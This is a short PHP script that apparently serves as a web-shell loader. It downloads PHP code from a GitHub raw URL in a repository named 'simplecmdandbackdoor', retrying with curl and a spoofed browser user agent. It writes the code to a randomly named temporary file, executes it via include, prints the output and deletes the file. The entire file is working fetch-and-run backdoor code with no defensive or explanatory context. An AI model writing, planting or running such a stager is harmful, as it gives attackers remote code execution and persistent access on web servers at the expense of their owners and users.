<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

function fetch_code($url) {
    $code = @file_get_contents($url);
    if ($code && strlen(trim($code)) > 10) return $code;

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0',
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
    ]);
    $code = curl_exec($ch);
    curl_close($ch);

    return $code;
}

$url = "https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/refs/heads/main/ws.php";
$code = fetch_code($url);

if (!$code || strlen(trim($code)) < 10) {
    die("❌");
}

$tmp = "tmp_" . md5(uniqid()) . ".php";
if (!file_put_contents($tmp, $code)) {
    die("❌");
}

ob_start();
include($tmp);
$output = ob_get_clean();
unlink($tmp);

if (trim($output) === "") {
    echo "⚠";
} else {
    echo $output;
}
?>
